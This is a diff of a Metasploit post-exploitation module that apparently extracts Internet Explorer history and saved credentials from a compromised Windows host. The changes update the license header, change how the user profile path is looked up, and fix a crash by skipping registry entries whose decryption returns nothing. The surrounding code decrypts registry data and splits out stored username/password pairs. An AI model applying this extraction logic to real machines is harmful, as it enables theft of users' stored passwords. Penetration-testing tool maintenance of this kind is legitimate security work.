@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -259,7 +257,7 @@ class Metasploit3 < Msf::Post
     xp_c = "\\Cookies\\index.dat"
     h_paths = []
     c_paths = []
-    base = session.fs.file.expand_path("%USERPROFILE%")
+    base = session.sys.config.getenv('USERPROFILE')
     if host['OS'] =~ /(Windows 7|2008|Vista)/
       h_paths << base + vist_h
       h_paths << base + vist_hlow
@@ -321,8 +319,15 @@ class Metasploit3 < Msf::Post
         if val_arr.include?(hash)
           data = registry_getvaldata(regpath, hash)
           dec = decrypt_reg(url, data)
+
+          # If CryptUnprotectData fails, decrypt_reg() will return "", and unpack() will end up
+          # returning an array of nils. If this happens, we can cause an "undefined method
+          # `+' for NilClass." when we try to calculate the offset, and this causes the module to die.
+          next if dec.empty?
+
           #decode data and add to creds array
           header = dec.unpack("VVVVVV")
+
           offset = header[0] + header[1] #offset to start of data
           cnt = header[5]/2 # of username/password combinations
           secrets = dec[offset,dec.length-(offset + 1)].split("\x00\x00")
